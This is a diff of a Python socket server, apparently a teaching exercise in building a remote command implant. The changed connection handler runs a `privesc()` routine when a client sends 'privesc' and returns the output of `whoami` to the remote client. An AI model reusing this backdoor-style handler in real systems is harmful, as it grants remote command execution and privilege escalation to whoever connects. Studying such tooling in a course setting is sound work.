@@ -88,8 +88,6 @@ def bootstrap_packages():
 
 
 def handle_conn(conn, addr):
-    run_command("whoami")
-    privesc()
     with conn:
         print(f"connected by {addr}")
         # If you need to receive more data, you may need to loop
@@ -98,17 +96,23 @@ def handle_conn(conn, addr):
         # It won't be closed. Hint: you might need to decide how to mark the "end of command data".
         # For example, you could send a length value before any command, decide on null byte as ending,
         # base64 encode every command, etc
-        data = conn.recv(1024) 
-        print("received: " + data.decode("utf-8", errors="replace"))
-        if not data:
+        raw_data = conn.recv(1024)
+        if not raw_data:
             return
+        
+        data = raw_data.decode("utf-8", errors="replace").strip()
+
+        print("received: " + data)
+        if data == "privesc":
+            print("Running privesc")
+            privesc()
         
 
         # Think VERY carefully about how you will communicate between the client and server
         # You will need to make a custom protocol to transfer commands
 
         try:
-            conn.sendall("Response data here".encode())
+            conn.sendall(run_command("whoami").stdout.encode())
             # Process the communication data from 
         except Exception as e:
             conn.sendall(f"error: {e}".encode())
